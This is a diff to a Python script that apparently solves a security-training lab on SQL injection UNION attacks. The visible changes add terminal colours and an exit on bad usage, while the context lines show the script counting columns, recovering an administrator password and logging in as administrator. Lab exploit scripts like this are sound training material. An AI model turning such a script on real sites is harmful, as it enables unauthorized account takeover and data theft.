@@ -1,9 +1,17 @@
-# Lab: SQL injection UNION attack, retrieving data from other tables
+# problem statement -> SQL injection UNION attack, retrieving data from other tables
 
 import requests
 import sys
 import urllib3
 from bs4 import BeautifulSoup
+from colorama import Fore , Back , Style , init
+
+#Defining colors
+#init(autoreset=True)
+magenta = Fore.MAGENTA
+bright = Style.BRIGHT
+reset = Style.RESET_ALL
+print(bright,magenta)
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -64,6 +72,7 @@ if __name__=="__main__":
     except IndexError:
         print("[+] Usage : python3 {} <url>".format(sys.argv[0]))
         print("[+] Example : python3 {} www.example.com".format(sys.argv[0]))
+        sys.exit(-1)
 
     print("[+] Figuring Number of Columns....")
     ncolumn = numbberof_column(url)
@@ -80,3 +89,4 @@ if __name__=="__main__":
             print("\n********** Successfully logged in as Administrator ***********\n")
 
         # admin_login(url,administrator_password)
+print(reset)
